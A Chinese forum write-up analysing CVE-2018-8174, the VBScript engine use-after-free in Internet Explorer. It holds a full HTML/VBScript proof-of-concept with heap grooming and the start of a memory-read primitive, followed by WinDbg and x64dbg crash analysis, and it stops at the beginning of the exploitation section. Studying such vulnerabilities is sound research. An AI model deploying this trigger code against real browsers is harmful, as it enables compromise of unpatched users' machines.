
# [原创]CVE-2018-8174 “双杀”0day 从UAF到Exploit

## 前言

这个漏洞是由于VBS脚本引擎在处理`Class`对象时存在释放后重用导致的，原始利用样本中的VBS代码有一定的混淆，主要是针对函数名和变量名以及常量，在经过本人还原后觉得这个漏洞还是比较有趣的，所以拿出来分享给大家一起学习。

## 实验环境

- 操作系统：Windows 7 sp1 32位
- 浏览器：IE11.0.9600.17843
- 调试器：`IDA`、`windbg`、`x64dbg`
- 原始Exploit样本：`0ddK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2W2P5s2m8D9L8$3W2@1i4K6u0V1k6r3u0Q4x3X3g2U0L8$3#2Q4x3V1k6W2P5s2m8D9L8$3W2@1M7#2)9J5c8U0b7@1y4K6b7I4`

## 漏洞分析

### 1. POC代码

```html
<!doctype html>

<html lang="en">

<head>

<meta http-equiv="x-ua-compatible" content="IE=10">

</head>

<body>

<script language="vbscript">

Dim gNumber

Dim arrayA(6),arrayB(6)

Dim index

Dim gArray(40)

Dim hexA, hexB

Dim address

Dim memClassA

Dim classGetPA

hexA = Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")

hexB = Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")

address = 0

index = 0

Class claA

Private Sub Class_Terminate()

	Set arrayA(index) = gNumber(1)

	index = index + 1

	gNumber(1) = 1

End Sub

End Class

Class testClass

End Class

Class memClass

Dim mem

Function P

End Function

Function SetProp(Value)

	mem = Value

	SetProp = 0

End Function

End Class

Class readMemClass

Dim mem

Function P0123456789

	P0123456789 = LenB(mem(address+8))

End Function

Function SPP

End Function

End Class

Class swapObject

Public Default Property Get P

Dim object

P = 174088534690791e-324

For i = 0 To 6

	arrayA(i) = 0

Next

Set object = New readMemClass

object.mem = hexA

For i = 0 To 6

	Set arrayA(i) = object

Next

End Property

End Class

Sub UAF

	For i = 0 To &h11

		Set gArray(i) = New testClass

	Next

	For i = &h14 To &h26

		Set gArray(i) = New memClass

	Next

    Msgbox "Create claA"

    index = 0

    For i = 0 To 6

		ReDim gNumber(1)

		Set gNumber(1) = New claA

		Erase gNumber

	Next

    Set memClassA = New memClass

End Sub

Sub InitObjects

	memClassA.SetProp(swapObjA)

End Sub

Sub StartExploit

    UAF

	InitObjects

End Sub

Set swapObjA = New swapObject

StartExploit

</script>

</body>

</html>
```

### 2. windbg开启堆调试支持

打开`cmd`输入`gflags.exe /i iexplore.exe +hpa`

![windbg堆调试](https://bbs.kanxue.com/upload/attach/202002/763252_3DJS37B4NJFD79V.jpg)

### 3. 运行POC用windbg捕获异常信息

#### 3.1 崩溃时寄存器信息

```
eax=06b0bfd0 ebx=6b770e50 ecx=00000009 edx=00000009 esi=0a04cf90 edi=00000009

eip=753e4971 esp=0585a558 ebp=0585a560 iopl=0         nv up ei pl nz na po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
```

#### 3.2 崩溃EIP处信息

```
753e4953 83f809          cmp     eax,9

753e4956 7430            je      OLEAUT32!VariantCopy+0x154 (753e4988)

753e4958 83f80d          cmp     eax,0Dh

753e495b 742b            je      OLEAUT32!VariantCopy+0x154 (753e4988)

753e495d 33c0            xor     eax,eax

753e495f 5b              pop     ebx

753e4960 5f              pop     edi

753e4961 5e              pop     esi

753e4962 c9              leave

753e4963 c20800          ret     8

753e4966 8b4608          mov     eax,dword ptr [esi+8]

753e4969 85c0            test    eax,eax

753e496b 0f8454f5ffff    je      OLEAUT32!VariantClear+0xc3 (753e3ec5)

753e4971 8b08            mov     ecx,dword ptr [eax]  ds:0023:068d5fd0=????????
```

#### 3.3 EAX指向内存信息

```
0:008> dd eax

06b0bfd0  ???????? ???????? ???????? ????????

06b0bfe0  ???????? ???????? ???????? ????????
```

#### 3.4 EAX上次内存管理信息

```
0:008> !heap -p -a eax

    address 068d5fd0 found in

    _DPH_HEAP_ROOT @ 6c1000

    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)

                                    6812d34:          68d5000             2000

    710190b2 verifier!AVrfDebugPageHeapFree+0x000000c2

    76e866ac ntdll!RtlDebugFreeHeap+0x0000002f

    76e4a13e ntdll!RtlpFreeHeap+0x0000005d

    76e165a6 ntdll!RtlFreeHeap+0x00000142

    756a98cd msvcrt!free+0x000000cd

    729a717a vbscript!VBScriptClass::`scalar deleting destructor'+0x0000001a

    729a71fd vbscript!VBScriptClass::Release+0x00000053

    753e4977 OLEAUT32!VariantClear+0x000000b9

    753fe325 OLEAUT32!ReleaseResources+0x000000a3

    753fdfb3 OLEAUT32!_SafeArrayDestroyData+0x00000048

    75405d2d OLEAUT32!SafeArrayDestroyData+0x0000000f

    75405d13 OLEAUT32!Thunk_SafeArrayDestroyData+0x00000039

    729f52d0 vbscript!VbsErase+0x00000050

    72994787 vbscript!StaticEntryPoint::Call+0x0000002f

    729957cb vbscript!CScriptRuntime::RunNoEH+0x00001d74

    7299526e vbscript!CScriptRuntime::Run+0x000000c3
```

#### 3.5 崩溃时堆栈信息

```
0:007> kv

ChildEBP RetAddr  Args to Child              

04a3ac30 6ed91afa 086fef90 077f8dd0 086fef90 OLEAUT32!VariantClear+0xb3 (FPO: [Non-Fpo])

04a3ac4c 6e6121b0 086fef90 077f8dd0 086fef90 IEShims!NS_ATLMitigation::APIHook_VariantClear+0x5d (FPO: [Non-Fpo])

04a3ac68 6e613014 09e48f04 00000010 04a3af50 vbscript!VAR::Clear+0x2d (FPO: [Non-Fpo])

04a3aca0 6e6276b0 077f8dd0 00000001 05bb9e00 vbscript!AssignVar+0x96 (FPO: [Non-Fpo])

04a3aee4 6e61526e 04a3b070 ae1e0428 077f8e50 vbscript!CScriptRuntime::RunNoEH+0x2440 (FPO: [Non-Fpo])
```

### 4. 总结windbg异常信息

从寄存器信息中获得崩溃时`EIP = 0x753e4971`，从对应EIP处观察出`EAX`指向的内存已被释放。通过查看上次内存管理发现`EAX`指向的是一个`VBScriptClass`，只有脚本中的`Class`被实例化时VBS脚本引擎才会创建一个对应的`VBScriptClass`对象。再通过观察堆栈信息可以确定是`AssignVar`函数分配变量的时候崩溃的，那么现在已经可以确定是类被释放掉后还存在引用导致的。

### 5. x64dbg调试分析

#### 5.1 下载符号表

运行POC等待弹框后附加进程，下载符号表

![下载符号表](https://bbs.kanxue.com/upload/attach/202002/763252_74WB5ZC74KW9Z9K.jpg)

#### 5.2 对关键函数下断点

符号表下载完成后重新运行POC，等待弹框后附加进程，对`VBScriptClass::Create`、`VBScriptClass::~VBScriptClass`下断。每当脚本中`New`一个`Class`的时候脚本引擎都会调用`VBScriptClass::Create`函数去创建一个`VBScriptClass`类，`VBScriptClass::~VBScriptClass`函数则是类的析构

![下断点](https://bbs.kanxue.com/upload/attach/202002/763252_UXEPNMJ8NTEA563.jpg)

#### 5.3 记录类的申请与释放

点掉弹框后会通过VBS引擎中的`VBScriptClass::Create`连续6次申请`claA`对象

![申请对象](https://bbs.kanxue.com/upload/attach/202002/763252_PP6EPPQW997NNNJ.jpg)

单步到`0x6ED09C9C`，拿到申请的对象内存地址`0x0528AFD0`

![对象地址](https://bbs.kanxue.com/upload/attach/202002/763252_5V47YCKJDVZCDNU.jpg)

`F9`直接运行后断到引擎中类的释放函数`VBScriptClass::~VBScriptClass`，观察`ECX`对象指针为`0x0528AFD0`，也就是说刚刚申请的对象这下又要被释放了

![释放对象](https://bbs.kanxue.com/upload/attach/202002/763252_YG57DC4CWCG9QD9.jpg)

这时候需要注意的是在`claA`对象的释放时，会触发`Terminate`事件，通过观察脚本代码可以看出来，在事件进行时`gNumber(1)`中存储了`claA`对象，在生命周期结束前，又把对象放入了`arrayA(index)`，所以就算对象释放了，`arrayA(index)`还是残留了`claA`的引用

![Terminate事件](https://bbs.kanxue.com/upload/attach/202002/763252_WE2RPQ68S4MGNTS.jpg)

`F8`到`ret`后再次观察类的内存布局，发现很多数据已经被释放掉了

![内存布局](https://bbs.kanxue.com/upload/attach/202002/763252_SB8DPE7PS4BFEBM.jpg)

#### 5.4 观察崩溃处信息

`Control+B`打开断点文档，用空格暂时屏蔽类的创建与析构函数断点

![屏蔽断点](https://bbs.kanxue.com/upload/attach/202002/763252_Z7FRFYM6FPB4SUV.jpg)

`F9`直接运行到崩溃点，可以看到`VARIANT`结构中的`0x0528AFD0`是上面释放的`claA`对象地址。观察下图可以很清晰的看到，是释放后的对象被重用了。关于`VARIANT`结构会在后面进行介绍

![崩溃点](https://bbs.kanxue.com/upload/attach/202002/763252_8QMDMUPDGC2J66R.jpg)

再次回到VBS脚本代码，可以看到在`swapObject`对象中，又对`arrayA`这个数组进行了赋值，而此时在数组中存储的是`claA`对象，对数组内数据赋值为0本来是不会有问题的，问题在于VBS脚本引擎使用`AssignVar`函数对变量赋值时，在赋值之前还会检查原来存储的数据是不是一个对象，如果是一个对象还会调用`VBScriptClass::Release`函数去减少对象的引用计数，也就是在调用`VBScriptClass::Release`函数准备去减少引用计数的时候发生了内存访问异常，导致了崩溃。

![VBS代码](https://bbs.kanxue.com/upload/attach/202002/763252_7NBHZERYJR238PF.jpg)

`VBScriptClass::Release`函数：

![Release函数](https://bbs.kanxue.com/upload/attach/202002/763252_3879ZCMFCAWB7RV.jpg)

### 6. x64dbg调试分析总结

在`VBScriptClass::Create`函数中创建名为`claA`的对象，因为删除数组而减少引用计数引发`VBScriptClass::~VBScriptClass`函数释放`claA`对象。在释放时触发`Terminate`事件，在事件进行中将`claA`对象存在了`arrayA`这个数组中，而后又对`arrayA`这个数组进行了填入0，由于填入0之前检查了其中存入的是一个VBS脚本对象，所以需要减少引用计数，但是对象已经被释放掉了，虚表的内存不可访问了，虚表不能访问自然就崩溃了。

## 漏洞利用

### 1. 必备数据结构

在利用前还需要对`VARIANT`这个结构有所了解，因为VBS脚本引擎存储数据时，默认使用`VARIANT`结构，`vt`字段描述了数据的类型，`wReserved1 - wReserved3`保留，变量数据存储在联合体中。
